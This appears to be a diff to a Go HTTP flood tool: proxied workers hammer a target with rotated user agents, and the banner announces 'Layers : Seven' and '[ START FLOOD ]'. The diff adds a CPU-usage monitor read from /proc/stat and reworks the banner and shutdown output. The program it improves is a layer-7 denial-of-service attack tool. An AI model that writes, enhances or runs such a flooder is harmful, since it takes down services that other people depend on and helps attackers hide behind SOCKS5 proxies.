@@ -12,6 +12,7 @@ import (
 	"os"
 	"os/signal"
 	"runtime"
+	"strconv"
 	"strings"
 	"sync"
 	"syscall"
@@ -108,6 +109,48 @@ func buatTransportSOCKS5(proxyAddr string) (*http.Transport, error) {
 	}, nil
 }
 
+func getCPUPercent() (float64, error) {
+	data, err := os.ReadFile("/proc/stat")
+	if err != nil {
+		return 0, err
+	}
+	lines := strings.Split(string(data), "\n")
+	for _, line := range lines {
+		if strings.HasPrefix(line, "cpu ") {
+			fields := strings.Fields(line)
+			if len(fields) < 8 {
+				continue
+			}
+			user, _ := strconv.ParseUint(fields[1], 10, 64)
+			nice, _ := strconv.ParseUint(fields[2], 10, 64)
+			system, _ := strconv.ParseUint(fields[3], 10, 64)
+			idle, _ := strconv.ParseUint(fields[4], 10, 64)
+			iowait, _ := strconv.ParseUint(fields[5], 10, 64)
+			irq, _ := strconv.ParseUint(fields[6], 10, 64)
+			softirq, _ := strconv.ParseUint(fields[7], 10, 64)
+			steal, _ := strconv.ParseUint(fields[8], 10, 64)
+			total := user + nice + system + idle + iowait + irq + softirq + steal
+			idleTotal := idle + iowait
+			return float64(total-idleTotal) / float64(total) * 100, nil
+		}
+	}
+	return 0, fmt.Errorf("cannot find cpu stats")
+}
+
+func statsPrinter(ctx context.Context) {
+	ticker := time.NewTicker(1 * time.Second)
+	defer ticker.Stop()
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case <-ticker.C:
+			cpu, _ := getCPUPercent()
+			fmt.Printf("\r[ CPU ] : %5.1f%%   ", cpu)
+		}
+	}
+}
+
 func worker(ctx context.Context, wg *sync.WaitGroup, target string, tr *http.Transport, rng *rand.Rand) {
 	defer wg.Done()
 	client := &http.Client{
@@ -118,12 +161,10 @@ func worker(ctx context.Context, wg *sync.WaitGroup, target string, tr *http.Tra
 		},
 	}
 	uaLen := len(userAgents)
-
 	localHeader := make(http.Header)
 	for k, v := range BeHa {
 		localHeader[k] = v
 	}
-
 	for {
 		select {
 		case <-ctx.Done():
@@ -179,8 +220,9 @@ func main() {
 	fmt.Printf("+ Ulimit  : 1048576\n")
 	fmt.Printf("+ Layers  : Seven\n")
 	fmt.Printf("+ Proxies : %d ( SOCKS5 )\n", len(proxies))
-	fmt.Printf("+ Transports : %d\n", TransportCount)
-	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n\n\n\n\n\n\n")
+	fmt.Printf("+ TransCn : %d\n", TransportCount)
+	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
+	fmt.Println("╰─▶ [ START FLOOD ]")
 
 	transportPool := make([]*http.Transport, TransportCount)
 	for i := 0; i < TransportCount; i++ {
@@ -206,6 +248,8 @@ func main() {
 	ctx, cancel := context.WithCancel(context.Background())
 	var wg sync.WaitGroup
 
+	go statsPrinter(ctx)
+
 	for i := 0; i < WorkerCount; i++ {
 		tr := transportPool[i%len(transportPool)]
 		rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(i*1000)))
@@ -216,7 +260,6 @@ func main() {
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	<-sigChan
-	fmt.Println("\nShutting down...")
 	cancel()
 	wg.Wait()
 }
